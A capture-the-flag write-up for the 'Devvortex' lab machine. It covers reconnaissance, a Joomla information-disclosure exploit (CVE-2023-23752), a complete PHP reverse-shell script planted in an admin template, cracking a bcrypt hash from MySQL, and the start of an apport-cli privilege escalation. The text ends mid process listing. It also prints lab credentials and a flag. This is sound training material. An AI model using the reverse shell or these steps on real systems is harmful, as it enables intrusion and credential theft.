# CTF Writeup: Devvortex

## Lab Description

Devvortex is an easy-difficulty Linux machine that features a Joomla CMS that is vulnerable to information disclosure. Accessing the service&amp;#039;s configuration file reveals plaintext credentials that lead to Administrative access to the Joomla instance. With administrative access, the Joomla template is modified to include malicious PHP code and gain a shell. After gaining a shell and enumerating the database contents, hashed credentials are obtained, which are cracked and lead to SSH access to the machine. Post-exploitation enumeration reveals that the user is allowed to run apport-cli as root, which is leveraged to obtain a root shell. 

---

## Reconaissance


An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 10.129.229.146    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 08:46 EDT
Nmap scan report for 10.129.229.146
Host is up (0.026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   21.83 ms 10.10.14.1
2   22.77 ms 10.129.229.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.10 seconds
```

The http service failed to redirect us to the domain devvortex.htb, let's map it to our target ip address in our local dns file /etc/hosts.

```
sudo echo "10.129.229.146 devvortex.htb" | sudo tee -a /etc/hosts
```

Enumerated subdomains on the webpage retrieved dev environment.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb' -fs 154 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 94ms]
:: Progress: [4989/4989] :: Job [1/1] :: 2325 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

Mapped the subdomain "dev.devvortex.htb" to the target ip in /etc/hosts.

```
nano /etc/hosts
```

Decided to enumerate endpoints utilizing dirsearch & was able to enumerate an exposed /administrator panel which seems to be running Joomla

```
dirsearch -u http://dev.devvortex.htb/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                         
 (_||| _) (/_(_|| (_| )                                                                                                  
                                                                                                                         
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_dev.devvortex.htb/__25-10-26_09-00-14.txt

Target: http://dev.devvortex.htb/

[09:00:14] Starting:                                                                                                     
[09:00:15] 403 -  564B  - /%2e%2e;/test
[09:00:15] 404 -   16B  - /php                                              
[09:00:38] 404 -   16B  - /adminphp                                         
[09:00:41] 403 -  564B  - /admin/.config                                    
[09:01:08] 301 -  178B  - /administrator  ->  http://dev.devvortex.htb/administrator/
[09:01:09] 403 -  564B  - /administrator/includes/                          
[09:01:09] 200 -   31B  - /administrator/cache/
[09:01:09] 301 -  178B  - /administrator/logs  ->  http://dev.devvortex.htb/administrator/logs/
[09:01:09] 200 -   31B  - /administrator/logs/
[09:01:10] 200 -   12KB - /administrator/                                   
[09:01:10] 200 -   12KB - /administrator/index.php                          
[09:01:16] 403 -  564B  - /admpar/.ftppass                                  
[09:01:16] 403 -  564B  - /admrev/.ftppass                                  
[09:01:18] 301 -  178B  - /api  ->  http://dev.devvortex.htb/api/
```

## Initial Access

Since the version of the joomla cms isn't disclosed on the /administrator panel, let's find out where the actual default path is, to retrieve the version of the joomla cms. Googled where the default path is and apparently it is /administrator/manifests/files/joomla.xml

```
curl http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
<?xml version="1.0" encoding="UTF-8"?>
<extension type="file" method="upgrade">
        <name>files_joomla</name>
        <author>Joomla! Project</author>
        <authorEmail>admin@joomla.org</authorEmail>
        <authorUrl>www.joomla.org</authorUrl>
        <copyright>(C) 2019 Open Source Matters, Inc.</copyright>
        <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
        <version>4.2.6</version>
        <creationDate>2022-12</creationDate>
        <description>FILES_JOOMLA_XML_DESCRIPTION</description>

        <scriptfile>administrator/components/com_admin/script.php</scriptfile>

        <update>
                <schemas>
                        <schemapath type="mysql">administrator/components/com_admin/sql/updates/mysql</schemapath>
                        <schemapath type="postgresql">administrator/components/com_admin/sql/updates/postgresql</schemapath>
                </schemas>
        </update>

        <fileset>
                <files>
                        <folder>administrator</folder>
                        <folder>api</folder>
                        <folder>cache</folder>
                        <folder>cli</folder>
                        <folder>components</folder>
                        <folder>images</folder>
                        <folder>includes</folder>
                        <folder>language</folder>
                        <folder>layouts</folder>
                        <folder>libraries</folder>
                        <folder>media</folder>
                        <folder>modules</folder>
                        <folder>plugins</folder>
                        <folder>templates</folder>
                        <folder>tmp</folder>
                        <file>htaccess.txt</file>
                        <file>web.config.txt</file>
                        <file>LICENSE.txt</file>
                        <file>README.txt</file>
                        <file>index.php</file>
                </files>
        </fileset>

        <updateservers>
                <server name="Joomla! Core" type="collection">https://update.joomla.org/core/list.xml</server>
        </updateservers>
</extension>
```

Retrieved Joomla CMS version 4.2.6 

Let's search up for CVE's! Found CVE-2023-23752

Downloaded it locally and gave it executable rights, I also had to install 3 "gems".

```
gem install httpx docopt paint
```

Running the Exploit provides us with plain-text credentials.

```
ruby CVE-2023-23752.rb http://dev.devvortex.htb 
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

With the retrieced credentials lewis:P4ntherg0t1n5r3c0n## we weren't able to login into ssh. But into the Joomla CMS Administrator Panel.

Navigated into Templates and edited the index.php in cassiopeia template.
It can be accessed under http://dev.devvortex.htb/templates/cassiopeia/index.php
So let's replace it with an php reverse shell script.

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.186';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

Started up my listener and curl'd the index.php file.

```
curl http://dev.devvortex.htb/
```

This didn't seem to work since we didn't had sufficient permissions to write the index.php of cassiopeia template. Let's try to navigate into the "Administrator Themes" and change the index.php there, the template there is called atum.

Replaced the index.php of atum with my revshell script and curl'd for it.

```
curl http://dev.devvortex.htb/administrator/templates/atum/index.php
```

Gained RCE as user "www-data".

```
nc -lvnp 1337     
listening on [any] 1337 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.229.146] 47698
Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 14:25:17 up  1:52,  0 users,  load average: 0.04, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Performed shell hardening

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Enumerated users on the target system.

```
www-data@devvortex:/$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
logan:x:1000:1000:,,,:/home/logan:/bin/bash
```

Discovered the configuration.php file in /var/www/dev.devvortex.htb/ inside this I discovered an secret variable with string output, I'm assuming it is an password, but it didn't seem to work with user logan.

```
public $secret = 'ZI7zLTbaGKliS9gq';
```

Verfified that MySQL Database is running on the target.

```
www-data@devvortex:~/dev.devvortex.htb$ netstat -tulnp
netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      852/nginx: worker p 
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      852/nginx: worker p 
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

Logged into mysql database with user lewis:P4ntherg0t1n5r3c0n##


```
mysql -u lewis -p
```

Gained encoded passwords of user lewis & logan.

```
mysql> select * from sd4fg_users;
select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2025-10-26 14:05:57 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)
```

logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12


Let's save the password hash in an password.hash on our local machine & bruteforce an password using john the ripper.

```
john password.hash --wordlist=/usr/share/wordlists/rockyou.txt                
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)     
1g 0:00:00:15 DONE (2025-10-26 10:48) 0.06565g/s 94.55p/s 94.55c/s 94.55C/s lacoste..michel
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Logged in with logan:tequieromucho via ssh.


```
ssh logan@devvortex.htb                   
logan@devvortex.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 26 Oct 2025 02:49:03 PM UTC

  System load:  0.0               Processes:             169
  Usage of /:   65.1% of 4.76GB   Users logged in:       0
  Memory usage: 18%               IPv4 address for eth0: 10.129.229.146
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 26 14:44:38 2024 from 10.10.14.23
logan@devvortex:~$
```

Retrieved user.txt in /home/logan directory.


```
3c7470856d1f55947604f296f5f09051
```

## Privilege Escalation


Prompting sudo -l allows us to run the binary /usr/bin/apport-cli. A script which we can run with root rights and no password authentication required.

Let's check for version of the binary.

```
/usr/bin/apport-cli -v
2.20.11
```

Let's perform vulnerability asssessment on it, maybe we can find some CVE's on it.

Found CVE-2023-1326, it provides us with the information that the exploit stems from the fact that apport-cli invokes a "pager" when viewing a crash, which can be used to run system commands. Since we run the command as root user, we can potentially trigger a shell.


```
logan@devvortex:~$ /usr/bin/apport-cli -h
Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]

Options:
  -h, --help            show this help message and exit
  -f, --file-bug        Start in bug filing mode. Requires --package and an
                        optional --pid, or just a --pid. If neither is given,
                        display a list of known symptoms. (Implied if a single
                        argument is given.)
```

Provides us with the information that in order to report a problem using apport-cli we will have to go into --file-bug mode & also prompt an PID of an process!

We can abuse this if we prompt an system process and /bin/bash it to get root shell.

Enumerated running processes on the target and retrieved system pid 1921
```
logan@devvortex:~$ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.2 167856 11272 ?        Ss   12:33   0:01 /sbin/init maybe-ubiquity
root           2  0.0  0.0      0     0 ?        S    12:33   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   12:33   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   12:33   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   12:33   0:00 [kworker/0:0H-kblockd]
root           8  0.0  0.0      0     0 ?        I<   12:33   0:00 [mm_percpu_wq]
root           9  0.0  0.0      0     0 ?        S    12:33   0:00 [ksoftirqd/0]
root          10  0.0  0.0      0     0 ?        I    12:33   0:01 [rcu_sched]
root          11  0.0  0.0      0     0 ?        S    12:33   0:00 [migration/0]
root          12  0.0  0.0      0     0 ?        S    12:33   0:00 [idle_inject/0]
root          14  0.0  0.0      0     0 ?        S    12:33   0:00 [cpuhp/0]
root          15  0.0  0.0      0     0 ?        S    12:33   0:00 [cpuhp/1]
root          16  0.0  0.0      0     0 ?        S    12:33   0:00 [idle_inject/1]
root          17  0.0  0.0      0     0 ?        S    12:33   0:00 [migration/1]
root          18  0.0  0.0      0     0 ?        S    12:33   0:00 [ksoftirqd/1]
root          20  0.0  0.0      0     0 ?        I<   12:33   0:00 [kworker/1:0H-kblockd]
root          21  0.0  0.0      0     0 ?        S    12:33   0:00 [kdevtmpfs]
root          22  0.0  0.0      0     0 ?        I<   12:33   0:00 [netns]
root          23  0.0  0.0      0     0 ?        S    12:33   0:00 [rcu_tasks_kthre]
root          24  0.0  0.0      0     0 ?        S    12:33   0:00 [kauditd]
root          25  0.0  0.0      0     0 ?        S    12:33   0:00 [khungtaskd]
root          26  0.0  0.0      0     0 ?        S    12:33   0:00 [oom_reaper]
root          27  0.0  0.0      0     0 ?        I<   12:33   0:00 [writeback]
root          28  0.0  0.0      0     0 ?        S    12:33   0:00 [kcompactd0]
root          29  0.0  0.0      0     0 ?        SN   12:33   0:00 [ksmd]
root          30  0.0  0.0      0     0 ?        SN   12:33   0:00 [khugepaged]
root          77  0.0  0.0      0     0 ?        I<   12:33   0:00 [kintegrityd]
root          78  0.0  0.0      0     0 ?        I<   12:33   0:00 [kblockd]
root          79  0.0  0.0      0     0 ?        I<   12:33   0:00 [blkcg_punt_bio]
root          80  0.0  0.0      0     0 ?        I<   12:33   0:00 [tpm_dev_wq]
root          81  0.0  0.0      0     0 ?        I<   12:33   0:00 [ata_sff]
root          82  0.0  0.0      0     0 ?        I<   12:33   0:00 [md]
root          83  0.0  0.0      0     0 ?        I<   12:33   0:00 [edac-poller]
root          84  0.0  0.0      0     0 ?        I<   12:33   0:00 [devfreq_wq]
root          85  0.0  0.0      0     0 ?        S    12:33   0:00 [watchdogd]
root          88  0.0  0.0      0     0 ?        S    12:33   0:00 [kswapd0]
root          89  0.0  0.0      0     0 ?        S    12:33   0:00 [ecryptfs-kthrea]
root          91  0.0  0.0      0     0 ?        I<   12:33   0:00 [kthrotld]
root          92  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/24-pciehp]
root          93  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/25-pciehp]
root          94  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/26-pciehp]
root          95  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/27-pciehp]
root          96  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/28-pciehp]
root          97  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/29-pciehp]
root          98  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/30-pciehp]
root          99  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/31-pciehp]
root         100  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/32-pciehp]
root         101  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/33-pciehp]
root         102  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/34-pciehp]
root         103  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/35-pciehp]
root         104  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/36-pciehp]
root         105  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/37-pciehp]
root         106  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/38-pciehp]
root         107  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/39-pciehp]
root         108  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/40-pciehp]
root         109  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/41-pciehp]
root         110  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/42-pciehp]
root         111  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/43-pciehp]
root         112  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/44-pciehp]
root         113  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/45-pciehp]
root         114  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/46-pciehp]
root         115  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/47-pciehp]
root         116  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/48-pciehp]
root         117  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/49-pciehp]
root         118  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/50-pciehp]
root         119  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/51-pciehp]
root         120  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/52-pciehp]
root         121  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/53-pciehp]
root         122  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/54-pciehp]
root         123  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/55-pciehp]
root         124  0.0  0.0      0     0 ?        I<   12:33   0:00 [acpi_thermal_pm]
root         125  0.0  0.0      0     0 ?        S    12:33   0:00 [scsi_eh_0]
root         126  0.0  0.0      0     0 ?        I<   12:33   0:00 [scsi_tmf_0]
root         127  0.0  0.0      0     0 ?        S    12:33   0:00 [scsi_eh_1]
root         128  0.0  0.0      0     0 ?        I<   12:33   0:00 [scsi_tmf_1]
root         130  0.0  0.0      0     0 ?        I<   12:33   0:00 [vfio-irqfd-clea]
root         131  0.0  0.0      0     0 ?        I<   12:33   0:00 [ipv6_addrconf]
root         141  0.0  0.0      0     0 ?        I<   12:33   0:00 [kstrp]
root         144  0.0  0.0      0     0 ?        I<   12:33   0:00 [kworker/u5:0]
root         157  0.0  0.0      0     0 ?        I<   12:33   0:00 [charger_manager]
root         202  0.0  0.0      0     0 ?        I<   12:33   0:00 [mpt_poll_0]
root         203  0.0  0.0      0     0 ?        I<   12:33   0:00 [cryptd]
root         212  0.0  0.0      0     0 ?        I<   12:33   0:00 [mpt/0]
root         239  0.0  0.0      0     0 ?        S    12:33   0:00 [irq/16-vmwgfx]
root         240  0.0  0.0      0     0 ?        I<   12:33   0:00 [ttm_swap]
root         241  0.0  0.0      0     0 ?        S    12:33   0:00 [scsi_eh_2]
root         242  0.0  0.0      0     0 ?        I<   12:33   0:00 [scsi_tmf_2]
root         243  0.0  0.0      0     0 ?        I<   12:33   0:02 [kworker/1:1H-kblockd]
root         272  0.0  0.0      0     0 ?        I<   12:33   0:00 [raid5wq]
root         323  0.0  0.0      0     0 ?        S    12:33   0:06 [jbd2/sda2-8]
root         324  0.0  0.0      0     0 ?        I<   12:33   0:00 [ext4-rsv-conver]
root         325  0.0  0.0      0     0 ?        I<   12:33   0:01 [kworker/0:1H-kblockd]
root         379  0.0  0.4  63152 16896 ?        S<s  12:33   0:01 /lib/systemd/systemd-journald
root         412  0.0  0.1  22500  5992 ?        Ss   12:33   0:00 /lib/systemd/systemd-udevd
root         536  0.0  0.0      0     0 ?        I<   12:33   0:00 [kaluad]
root         537  0.0  0.0      0     0 ?        I<   12:33   0:00 [kmpath_rdacd]
root         538  0.0  0.0      0     0 ?        I<   12:33   0:00 [kmpathd]
root         539  0.0  0.0      0     0 ?        I<   12:33   0:00 [kmpath_handlerd]
root         540  0.0  0.4 214664 18000 ?        SLsl 12:33   0:00 /sbin/multipathd -d -s
systemd+     562  0.0  0.1  90884  6104 ?        Ssl  12:33   0:00 /lib/systemd/systemd-timesyncd
root         564  0.0  0.0  11356  1684 ?        S<sl 12:33   0:00 /sbin/auditd
root         588  0.0  0.2  47544 10748 ?        Ss   12:33   0:00 /usr/bin/VGAuthService
root         591  0.0  0.2 311508  8108 ?        Ssl  12:33   0:09 /usr/bin/vmtoolsd
root         614  0.0  0.0      0     0 ?        S    12:33   0:00 [audit_prune_tre]
root         617  0.0  0.1  99896  6048 ?        Ssl  12:33   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid 
root         635  0.0  0.2 239300  9292 ?        Ssl  12:33   0:00 /usr/lib/accountsservice/accounts-daemon
message+     636  0.0  0.1   7384  4496 ?        Ss   12:33   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nof
root         644  0.0  0.0  81960  3716 ?        Ssl  12:33   0:00 /usr/sbin/irqbalance --foreground
root         645  0.0  0.2 236444  9104 ?        Ssl  12:33   0:00 /usr/lib/policykit-1/polkitd --no-debug
syslog       649  0.0  0.1 224344  5016 ?        Ssl  12:33   0:00 /usr/sbin/rsyslogd -n -iNONE
root         660  0.0  0.1  17352  7580 ?        Ss   12:33   0:00 /lib/systemd/systemd-logind
root         661  0.0  0.3 395504 13576 ?        Ssl  12:33   0:00 /usr/lib/udisks2/udisksd
root         720  0.0  0.3 318828 13600 ?        Ssl  12:33   0:00 /usr/sbin/ModemManager
systemd+     777  0.0  0.3  24708 13216 ?        Ss   12:33   0:01 /lib/systemd/systemd-resolved
root         826  0.0  0.0   6816  3000 ?        Ss   12:33   0:00 /usr/sbin/cron -f
root         827  0.0  0.7 220696 31576 ?        Ss   12:33   0:01 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf
daemon       830  0.0  0.0   3796  2304 ?        Ss   12:33   0:00 /usr/sbin/atd -f
root         832  0.0  0.1  12184  7280 ?        Ss   12:33   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startup
root         851  0.0  0.0  51204  1616 ?        Ss   12:33   0:00 nginx: master process /usr/sbin/nginx -g daemon on; ma
www-data     852  0.1  0.1  52196  6456 ?        S    12:33   0:14 nginx: worker process
www-data     853  0.4  0.1  52652  7012 ?        S    12:33   0:46 nginx: worker process
root         865  0.0  0.0   5828  1844 tty1     Ss+  12:33   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
mysql        888  2.3 11.3 1831780 456016 ?      Ssl  12:33   3:51 /usr/sbin/mysqld
